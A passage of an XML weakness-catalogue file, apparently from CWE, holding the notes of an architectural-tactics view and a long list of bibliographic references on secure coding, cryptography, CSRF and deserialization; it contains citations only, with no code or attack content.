            <Reference External_Reference_ID="REF-9"/>
            <Reference External_Reference_ID="REF-10" Section="pages 69 - 78"/>
         </References>
         <Notes>
            <Note Type="Other">The top level categories in this view represent the individual tactics that are part of a secure-by-design approach to software development. The weaknesses that are members of each category contain information about how each is introduced relative to the software's architecture. Three different modes of introduction are used: Omission - caused by missing a security tactic when it is necessary. Commission - refers to incorrect choice of tactics which could result in undesirable consequences. Realization - appropriate security tactics are adopted but are incorrectly implemented.</Note>
            <Note Type="Maintenance">This view is under development, and subsequent releases will focus on reviewing the individual weaknesses to verify their inclusion in this view and adding any applicable ChildOf relationships. Comments about revisions are welcome.</Note>
         </Notes>
         
      </View>
   </Views>
   <External_References>
      <External_Reference Reference_ID="REF-10">
		  <Author>Santos, J. C. S.</Author>
		  <Author>Peruma, A.</Author>
		  <Author>Mirakhorli, M.</Author>
		  <Author>Galster, M.</Author>
		  <Author>Sejfia, A.</Author>
		  <Title>Understanding Software Vulnerabilities Related to Architectural Security Tactics: An Empirical Investigation of Chromium, PHP and Thunderbird.</Title>
		  <Publication>2017 IEEE International Conference on Software Architecture (ICSA)</Publication>
		  <Publication_Year>2017</Publication_Year>
		  <URL>https://design.se.rit.edu/papers/TacticalVulnerabilities.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-140">
		  <Author>Greg Hoglund</Author>
		  <Author>Gary McGraw</Author>
		  <Title>Exploiting Software: How to Break Code</Title>
		  <Publication_Year>2004</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---27</Publication_Day>
		  <Publisher>Addison-Wesley</Publisher>
		  <URL>https://www.amazon.com/Exploiting-Software-How-Break-Code/dp/0201786958</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-166">
		  <Author>Jim Manico</Author>
		  <Title>Input Validation with ESAPI - Very Important</Title>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <Publication_Day>---15</Publication_Day>
		  <URL>http://manicode.blogspot.com/2008/08/input-validation-with-esapi.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-168">
		  <Author>Joel Scambray</Author>
		  <Author>Mike Shema</Author>
		  <Author>Caleb Sima</Author>
		  <Title>Hacking Exposed Web Applications, Second Edition</Title>
		  <Publication_Year>2006</Publication_Year>
		  <Publication_Month>--06</Publication_Month>
		  <Publication_Day>---05</Publication_Day>
		  <Publisher>McGraw-Hill</Publisher>
	   </External_Reference>
      <External_Reference Reference_ID="REF-170">
		  <Author>Kevin Beaver</Author>
		  <Title>The importance of input validation</Title>
		  <Publication_Year>2006</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <Publication_Day>---06</Publication_Day>
		  <URL>http://searchsoftwarequality.techtarget.com/tip/0,289483,sid92_gci1214373,00.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-172">
		  <Author>Chris Wysopal</Author>
		  <Title>Mobile App Top 10 List</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <Publication_Day>---13</Publication_Day>
		  <URL>http://www.veracode.com/blog/2010/12/mobile-app-top-10-list/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-174">
		  <Author>Web Application Security Consortium</Author>
		  <Title>Information Leakage</Title>
		  <URL>http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-175">
		  <Author>Brian Chess</Author>
		  <Author>Jacob West</Author>
		  <Title>Secure Programming with Static Analysis</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publisher>Addison-Wesley</Publisher>
	   </External_Reference>
      <External_Reference Reference_ID="REF-176">
		  <Author>Michael Howard</Author>
		  <Author>David LeBlanc</Author>
		  <Title>Writing Secure Code</Title>
		  <Edition>1st Edition</Edition>
		  <Publication_Year>2001</Publication_Year>
		  <Publication_Month>--11</Publication_Month>
		  <Publication_Day>---13</Publication_Day>
		  <Publisher>Microsoft Press</Publisher>
	   </External_Reference>
      <External_Reference Reference_ID="REF-179">
		  <Author>Johannes Ullrich</Author>
		  <Title>Top 25 Series - Rank 16 - Information Exposure Through an Error Message</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---17</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://software-security.sans.org/blog/2010/03/17/top-25-series-rank-16-information-exposure-through-an-error-message</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-185">
		  <Author>OWASP</Author>
		  <Title>Testing for Path Traversal (OWASP-AZ-001)</Title>
		  <URL>http://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-196">
		  <Author>Jerome H. Saltzer</Author>
		  <Author>Michael D. Schroeder</Author>
		  <Title>The Protection of Information in Computer Systems</Title>
		  <Publication>Proceedings of the IEEE 63</Publication>
		  <Publication_Year>1975</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <URL>http://web.mit.edu/Saltzer/www/publications/protection/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-199">
		  <Author>NIST</Author>
		  <Title>Federal Desktop Core Configuration</Title>
		  <URL>http://nvd.nist.gov/fdcc/index.cfm</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-207">
		  <Author>John Viega</Author>
		  <Author>Gary McGraw</Author>
		  <Title>Building Secure Software: How to Avoid Security Problems the Right Way</Title>
		  <Edition>1st Edition</Edition>
		  <Publication_Year>2002</Publication_Year>
		  <Publisher>Addison-Wesley</Publisher>
	   </External_Reference>
      <External_Reference Reference_ID="REF-229">
		  <Author>NIST</Author>
		  <Title>Role Based Access Control and Role Based Security</Title>
		  <URL>http://csrc.nist.gov/groups/SNS/rbac/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-231">
		  <Author>Frank Kim</Author>
		  <Title>Top 25 Series - Rank 5 - Improper Access Control (Authorization)</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---04</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/04/top-25-series-rank-5-improper-access-control-authorization/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-233">
		  <Author>Rahul Bhattacharjee</Author>
		  <Title>Authentication using JAAS</Title>
		  <URL>http://www.javaranch.com/journal/2008/04/authentication-using-JAAS.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-236">
		  <Author>Kim Zetter</Author>
		  <Title>Weak Password Brings 'Happiness' to Twitter Hacker</Title>
		  <Publication_Year>2009</Publication_Year>
		  <Publication_Month>--01</Publication_Month>
		  <Publication_Day>---09</Publication_Day>
		  <URL>http://www.wired.com/threatlevel/2009/01/professed-twitt/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-237">
		  <Author>OWASP</Author>
		  <Title>Top 10 2007-Broken Authentication and Session Management</Title>
		  <Publication_Year>2007</Publication_Year>
		  <URL>http://www.owasp.org/index.php/Top_10_2007-A7</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-238">
		  <Author>OWASP</Author>
		  <Title>Guide to Authentication</Title>
		  <URL>http://www.owasp.org/index.php/Guide_to_Authentication</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-239">
		  <Author>Microsoft</Author>
		  <Title>Authentication</Title>
		  <URL>http://msdn.microsoft.com/en-us/library/aa374735(VS.85).aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-243">
		  <Author>Sascha Fahl, Marian Harbach, Thomas Muders, Matthew Smith</Author>
		  <Author>Lars Baumgärtner, Bernd Freisleben</Author>
		  <Title>Why Eve and Mallory Love Android: An Analysis of Android SSL (In)Security</Title>
		  <Publication_Year>2012</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <Publication_Day>---16</Publication_Day>
		  <URL>http://www2.dcsec.uni-hannover.de/files/android/p50-fahl.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-244">
		  <Author>M. Bishop</Author>
		  <Title>Computer Security: Art and Science</Title>
		  <Publication_Year>2003</Publication_Year>
		  <Publisher>Addison-Wesley</Publisher>
	   </External_Reference>
      <External_Reference Reference_ID="REF-245">
		  <Author>Martin Georgiev</Author>
		  <Author>Subodh Iyengar</Author>
		  <Author>Suman Jana</Author>
		  <Author>Rishita Anubhai</Author>
		  <Author>Dan Boneh</Author>
		  <Author>Vitaly Shmatikov</Author>
		  <Title>The Most Dangerous Code in the World: Validating SSL Certificates in Non-Browser Software</Title>
		  <Publication_Year>2012</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <Publication_Day>---25</Publication_Day>
		  <URL>http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-249">
		  <Author>Kenneth Ballard</Author>
		  <Title>Secure programming with the OpenSSL API, Part 2: Secure handshake</Title>
		  <Publication_Year>2005</Publication_Year>
		  <Publication_Month>--05</Publication_Month>
		  <Publication_Day>---03</Publication_Day>
		  <URL>http://www.ibm.com/developerworks/library/l-openssl2/index.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-250">
		  <Author>Eric Rescorla</Author>
		  <Title>An Introduction to OpenSSL Programming (Part I)</Title>
		  <Publication_Year>2001</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <Publication_Day>---05</Publication_Day>
		  <URL>http://www.rtfm.com/openssl-examples/part1.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-257">
		  <Author>Frank Kim</Author>
		  <Title>Top 25 Series - Rank 19 - Missing Authentication for Critical Function</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---23</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/02/23/top-25-series-rank-19-missing-authentication-for-critical-function/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-265">
		  <Author>Frank Kim</Author>
		  <Title>Top 25 Series - Rank 10 - Missing Encryption of Sensitive Data</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---26</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/02/26/top-25-series-rank-10-missing-encryption-of-sensitive-data/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-267">
		  <Author>Information Technology Laboratory, National Institute of Standards and Technology</Author>
		  <Title>SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES</Title>
		  <Publication_Year>2001</Publication_Year>
		  <Publication_Month>--05</Publication_Month>
		  <Publication_Day>---25</Publication_Day>
		  <URL>http://csrc.nist.gov/publications/fips/fips140-2/fips1402.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-271">
		  <Author>OWASP</Author>
		  <Title>Top 10 2007-Insecure Communications</Title>
		  <Publication_Year>2007</Publication_Year>
		  <URL>http://www.owasp.org/index.php/Top_10_2007-A9</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-280">
		  <Author>Bruce Schneier</Author>
		  <Title>Applied Cryptography</Title>
		  <Publication_Year>1996</Publication_Year>
		  <Publisher>John Wiley &amp; Sons</Publisher>
		  <URL>http://www.schneier.com/book-applied.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-281">
		  <Author>Alfred J. Menezes</Author>
		  <Author>Paul C. van Oorschot</Author>
		  <Author>Scott A. Vanstone</Author>
		  <Title>Handbook of Applied Cryptography</Title>
		  <Publication_Year>1996</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <URL>http://www.cacr.math.uwaterloo.ca/hac/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-282">
		  <Author>C Matthew Curtin</Author>
		  <Title>Avoiding bogus encryption products: Snake Oil FAQ</Title>
		  <Publication_Year>1998</Publication_Year>
		  <Publication_Month>--04</Publication_Month>
		  <Publication_Day>---10</Publication_Day>
		  <URL>http://www.faqs.org/faqs/cryptography-faq/snake-oil/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-284">
		  <Author>Paul F. Roberts</Author>
		  <Title>Microsoft Scraps Old Encryption in New Code</Title>
		  <Publication_Year>2005</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <Publication_Day>---15</Publication_Day>
		  <URL>http://www.eweek.com/c/a/Security/Microsoft-Scraps-Old-Encryption-in-New-Code/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-287">
		  <Author>Johannes Ullrich</Author>
		  <Title>Top 25 Series - Rank 24 - Use of a Broken or Risky Cryptographic Algorithm</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---25</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/25/top-25-series-rank-24-use-of-a-broken-or-risky-cryptographic-algorithm/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-289">
		  <Author>Alexander Sotirov et al.</Author>
		  <Title>MD5 considered harmful today</Title>
		  <URL>http://www.phreedom.org/research/rogue-ca/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-291">
		  <Author>Johnny Shelley</Author>
		  <Title>bcrypt</Title>
		  <URL>http://bcrypt.sourceforge.net/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-292">
		  <Author>Colin Percival</Author>
		  <Title>Tarsnap - The scrypt key derivation function and encryption utility</Title>
		  <URL>http://www.tarsnap.com/scrypt.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-293">
		  <Author>B. Kaliski</Author>
		  <Title>RFC2898 - PKCS #5: Password-Based Cryptography Specification Version 2.0</Title>
		  <Publication_Year>2000</Publication_Year>
		  <URL>http://tools.ietf.org/html/rfc2898</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-294">
		  <Author>Coda Hale</Author>
		  <Title>How To Safely Store A Password</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--01</Publication_Month>
		  <Publication_Day>---31</Publication_Day>
		  <URL>http://codahale.com/how-to-safely-store-a-password/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-295">
		  <Author>Brian Krebs</Author>
		  <Title>How Companies Can Beef Up Password Security (interview with Thomas H. Ptacek)</Title>
		  <Publication_Year>2012</Publication_Year>
		  <Publication_Month>--06</Publication_Month>
		  <Publication_Day>---11</Publication_Day>
		  <URL>http://krebsonsecurity.com/2012/06/how-companies-can-beef-up-password-security/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-296">
		  <Author>Solar Designer</Author>
		  <Title>Password security: past, present, future</Title>
		  <Publication_Year>2012</Publication_Year>
		  <URL>http://www.openwall.com/presentations/PHDays2012-Password-Security/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-297">
		  <Author>Troy Hunt</Author>
		  <Title>Our password hashing has no clothes</Title>
		  <Publication_Year>2012</Publication_Year>
		  <Publication_Month>--06</Publication_Month>
		  <Publication_Day>---26</Publication_Day>
		  <URL>http://www.troyhunt.com/2012/06/our-password-hashing-has-no-clothes.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-298">
		  <Author>Joshbw</Author>
		  <Title>Should we really use bcrypt/scrypt?</Title>
		  <Publication_Year>2012</Publication_Year>
		  <Publication_Month>--06</Publication_Month>
		  <Publication_Day>---08</Publication_Day>
		  <URL>http://www.analyticalengine.net/2012/06/should-we-really-use-bcryptscrypt/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-324">
		  <Author>Taimur Aslam</Author>
		  <Title>A Taxonomy of Security Faults in the UNIX Operating System</Title>
		  <Publication_Year>1995</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <Publication_Day>---01</Publication_Day>
		  <URL>http://cwe.mitre.org/documents/sources/ATaxonomyofSecurityFaultsintheUNIXOperatingSystem%5BAslam95%5D.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-329">
		  <Author>Peter W</Author>
		  <Title>Cross-Site Request Forgeries (Re: The Dangers of Allowing Users to Post Images)</Title>
		  <Publication>Bugtraq</Publication>
		  <URL>http://marc.info/?l=bugtraq&amp;m=99263135911884&amp;w=2</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-330">
		  <Author>OWASP</Author>
		  <Title>Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</Title>
		  <URL>http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-331">
		  <Author>Edward W. Felten</Author>
		  <Author>William Zeller</Author>
		  <Title>Cross-Site Request Forgeries: Exploitation and Prevention</Title>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <Publication_Day>---18</Publication_Day>
		  <URL>http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.147.1445</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-332">
		  <Author>Robert Auger</Author>
		  <Title>CSRF - The Cross-Site Request Forgery (CSRF/XSRF) FAQ</Title>
		  <URL>http://www.cgisecurity.com/articles/csrf-faq.shtml</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-333">
		  <Title>Cross-site request forgery</Title>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <Publication_Day>---22</Publication_Day>
		  <Publisher>Wikipedia</Publisher>
		  <URL>http://en.wikipedia.org/wiki/Cross-site_request_forgery</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-334">
		  <Author>Jason Lam</Author>
		  <Title>Top 25 Series - Rank 4 - Cross Site Request Forgery</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---03</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://software-security.sans.org/blog/2010/03/03/top-25-series-rank-4-cross-site-request-forgery</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-335">
		  <Author>Jeff Atwood</Author>
		  <Title>Preventing CSRF and XSRF Attacks</Title>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <Publication_Day>---14</Publication_Day>
		  <URL>http://www.codinghorror.com/blog/2008/10/preventing-csrf-and-xsrf-attacks.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-338">
		  <Author>J. Oates</Author>
		  <Title>AOL man pleads guilty to selling 92m email addies</Title>
		  <Publication>The Register</Publication>
		  <Publication_Year>2005</Publication_Year>
		  <URL>http://www.theregister.co.uk/2005/02/07/aol_email_theft/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-339">
		  <Author>NIST</Author>
		  <Title>Guide to Protecting the Confidentiality of Personally Identifiable Information (SP 800-122)</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--04</Publication_Month>
		  <URL>http://csrc.nist.gov/publications/nistpubs/800-122/sp800-122.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-340">
		  <Author>U.S. Department of Commerce</Author>
		  <Title>Safe Harbor Privacy Framework</Title>
		  <URL>http://www.export.gov/safeharbor/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-341">
		  <Author>Federal Trade Commission</Author>
		  <Title>Financial Privacy: The Gramm-Leach Bliley Act (GLBA)</Title>
		  <URL>http://www.ftc.gov/privacy/glbact/index.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-342">
		  <Author>U.S. Department of Human Services</Author>
		  <Title>Health Insurance Portability and Accountability Act (HIPAA)</Title>
		  <URL>http://www.hhs.gov/ocr/hipaa/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-343">
		  <Author>Government of the State of California</Author>
		  <Title>California SB-1386</Title>
		  <Publication_Year>2002</Publication_Year>
		  <URL>http://info.sen.ca.gov/pub/01-02/bill/sen/sb_1351-1400/sb_1386_bill_20020926_chaptered.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-386">
		  <Author>Joao Antunes</Author>
		  <Author>Nuno Ferreira Neves</Author>
		  <Author>Paulo Verissimo</Author>
		  <Title>Detection and Prediction of Resource-Exhaustion Vulnerabilities</Title>
		  <Publication>Proceedings of the IEEE International Symposium on Software Reliability Engineering (ISSRE)</Publication>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--11</Publication_Month>
		  <URL>http://homepages.di.fc.ul.pt/~nuno/PAPERS/ISSRE08.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-387">
		  <Author>D.J. Bernstein</Author>
		  <Title>Resource exhaustion</Title>
		  <URL>http://cr.yp.to/docs/resources.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-388">
		  <Author>Pascal Meunier</Author>
		  <Title>Resource exhaustion</Title>
		  <Publication>Secure Programming Educational Material</Publication>
		  <Publication_Year>2004</Publication_Year>
		  <URL>http://homes.cerias.purdue.edu/~pmeunier/secprog/sanitized/class1/6.resource%20exhaustion.ppt</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-392">
		  <Author>Paul Roberts</Author>
		  <Title>File descriptors and setuid applications</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---05</Publication_Day>
		  <URL>https://blogs.oracle.com/paulr/entry/file_descriptors_and_setuid_applications</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-393">
		  <Author>Apple</Author>
		  <Title>Introduction to Secure Coding Guide</Title>
		  <URL>https://developer.apple.com/library/mac/#documentation/security/conceptual/SecureCodingGuide/Articles/AccessControl.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-422">
		  <Author>Richard Stanway (r1CH)</Author>
		  <Title>Dynamic File Uploads, Security and You</Title>
		  <URL>http://shsc.info/FileUploadSecurity</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-423">
		  <Author>Johannes Ullrich</Author>
		  <Title>8 Basic Rules to Implement Secure File Uploads</Title>
		  <Publication_Year>2009</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <Publication_Day>---28</Publication_Day>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2009/12/28/8-basic-rules-to-implement-secure-file-uploads/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-424">
		  <Author>Johannes Ullrich</Author>
		  <Title>Top 25 Series - Rank 8 - Unrestricted Upload of Dangerous File Type</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---25</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/02/25/top-25-series-rank-8-unrestricted-upload-of-dangerous-file-type/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-43">
		  <Author>OWASP</Author>
		  <Title>OWASP TOP 10</Title>
		  <URL>http://www.owasp.org/index.php/Top_10_2007</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-432">
		  <Author>Norm Hardy</Author>
		  <Title>The Confused Deputy (or why capabilities might have been invented)</Title>
		  <Publication_Year>1988</Publication_Year>
		  <URL>http://www.cap-lore.com/CapTheory/ConfusedDeputy.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-44">
		  <Author>Michael Howard</Author>
		  <Author>David LeBlanc</Author>
		  <Author>John Viega</Author>
		  <Title>24 Deadly Sins of Software Security</Title>
		  <Publication>McGraw-Hill</Publication>
		  <Publication_Year>2010</Publication_Year>
	   </External_Reference>
      <External_Reference Reference_ID="REF-45">
		  <Author>OWASP</Author>
		  <Title>OWASP Enterprise Security API (ESAPI) Project</Title>
		  <URL>http://www.owasp.org/index.php/ESAPI</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-454">
		  <Author>Microsoft</Author>
		  <Title>Introduction to Code Signing</Title>
		  <URL>http://msdn.microsoft.com/en-us/library/ms537361(VS.85).aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-455">
		  <Author>Microsoft</Author>
		  <Title>Authenticode</Title>
		  <URL>http://msdn.microsoft.com/en-us/library/ms537359(v=VS.85).aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-456">
		  <Author>Apple</Author>
		  <Title>Code Signing Guide</Title>
		  <Publication>Apple Developer Connection</Publication>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--11</Publication_Month>
		  <Publication_Day>---19</Publication_Day>
		  <URL>http://developer.apple.com/documentation/Security/Conceptual/CodeSigningGuide/Introduction/chapter_1_section_1.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-457">
		  <Author>Anthony Bellissimo</Author>
		  <Author>John Burgess</Author>
		  <Author>Kevin Fu</Author>
		  <Title>Secure Software Updates: Disappointments and New Challenges</Title>
		  <URL>http://prisms.cs.umass.edu/~kevinfu/papers/secureupdates-hotsec06.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-459">
		  <Author>Johannes Ullrich</Author>
		  <Title>Top 25 Series - Rank 20 - Download of Code Without Integrity Check</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--04</Publication_Month>
		  <Publication_Day>---05</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/04/05/top-25-series-rank-20-download-code-integrity-check/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-461">
		  <Author>Matthias Kaiser</Author>
		  <Title>Exploiting Deserialization Vulnerabilities in Java</Title>
		  <Publication_Year>2015</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <Publication_Day>---28</Publication_Day>
		  <URL>http://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-462">
		  <Author>Sam Thomas</Author>
		  <Title>PHP unserialization vulnerabilities: What are we missing?</Title>
		  <Publication_Year>2015</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <Publication_Day>---27</Publication_Day>
		  <URL>http://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-463">
		  <Author>Gabriel Lawrence</Author>
		  <Author>Chris Frohoff</Author>
		  <Title>Marshalling Pickles: How deserializing objects can ruin your day</Title>
		  <Publication_Year>2015</Publication_Year>
		  <Publication_Month>--01</Publication_Month>
		  <Publication_Day>---28</Publication_Day>
		  <URL>http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-464">
		  <Author>Heine Deelstra</Author>
		  <Title>Unserializing user-supplied data, a bad idea</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <Publication_Day>---25</Publication_Day>
		  <URL>http://heine.familiedeelstra.com/security/unserialize</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-465">
		  <Author>Manish S. Saindane</Author>
		  <Title>Black Hat EU 2010 - Attacking Java Serialized Communication</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--04</Publication_Month>
		  <Publication_Day>---26</Publication_Day>
		  <URL>http://www.slideshare.net/msaindane/black-hat-eu-2010-attacking-java-serialized-communication</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-466">
		  <Author>Nadia Alramli</Author>
		  <Title>Why Python Pickle is Insecure</Title>
		  <Publication_Year>2009</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <Publication_Day>---09</Publication_Day>
		  <URL>http://nadiana.com/python-pickle-insecure</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-467">
		  <Author>Nelson Elhage</Author>
		  <Title>Exploiting misuse of Python's "pickle"</Title>
		  <Publication_Year>2011</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---20</Publication_Day>
		  <URL>https://blog.nelhage.com/2011/03/exploiting-pickle/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-468">
		  <Author>Chris Frohoff</Author>
		  <Title>Deserialize My Shorts: Or How I Learned to Start Worrying and Hate Java Object Deserialization</Title>
		  <Publication_Year>2016</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---21</Publication_Day>
		  <URL>https://www.slideshare.net/frohoff1/deserialize-my-shorts-or-how-i-learned-to-start-worrying-and-hate-java-object-deserialization</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-48">
		  <Author>Jeremiah Grossman</Author>
		  <Title>Input validation or output filtering, which is better?</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--01</Publication_Month>
		  <Publication_Day>---30</Publication_Day>
		  <URL>http://jeremiahgrossman.blogspot.com/2007/01/input-validation-or-output-filtering.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-482">
		  <Author>Zvi Gutterman</Author>
		  <Title>Hold Your Sessions: An Attack on Java Session-id Generation</Title>
		  <Publication_Year>2005</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---13</Publication_Day>
		  <URL>http://www.securiteam.com/securityreviews/5TP0F0UEVQ.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-483">
		  <Author>Craig A. Shue</Author>
		  <Author>Andrew J. Kalafut</Author>
		  <Author>Minaxi Gupta</Author>
		  <Title>Exploitable Redirects on the Web: Identification, Prevalence, and Defense</Title>
